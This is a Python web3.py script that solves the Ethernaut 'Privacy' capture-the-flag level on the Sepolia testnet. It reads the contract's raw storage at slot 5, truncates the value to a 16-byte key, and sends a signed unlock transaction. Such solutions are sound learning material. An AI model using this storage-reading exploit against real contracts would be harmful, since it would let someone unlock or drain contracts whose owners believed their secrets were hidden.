import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to Sepolia via provider!")
else:
    print("Failed to connect to Sepolia via provider.")
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


# Load Ethernaut deployed contract
_ethernaut_deployed_contract_address = w3.to_checksum_address("")
privacy_contract = compile_contract('./Privacy.sol', '0.8.0', 'Privacy')
privacy_contract = w3.eth.contract(address=_ethernaut_deployed_contract_address, abi=privacy_contract['abi'])
assert privacy_contract.functions.locked().call()  # Initial check to make sure its locked

slot = 5  # checked that the key to unlock, is stored at slot 5
data = w3.eth.get_storage_at(privacy_contract.address, slot)
key = data[:16]
tx = privacy_contract.functions.unlock(key).build_transaction({
    'from': _WALLET,
    'chainId': 11155111,  # sepolia testnet chain id
    'gas': privacy_contract.functions.unlock(key).estimate_gas({'from': _WALLET}),
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=_PRIVATE_KEY)

tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
assert tx_receipt['status'] == 1

unlocked = privacy_contract.functions.locked().call()
assert not unlocked
print('Well done, You have completed this level!!!')
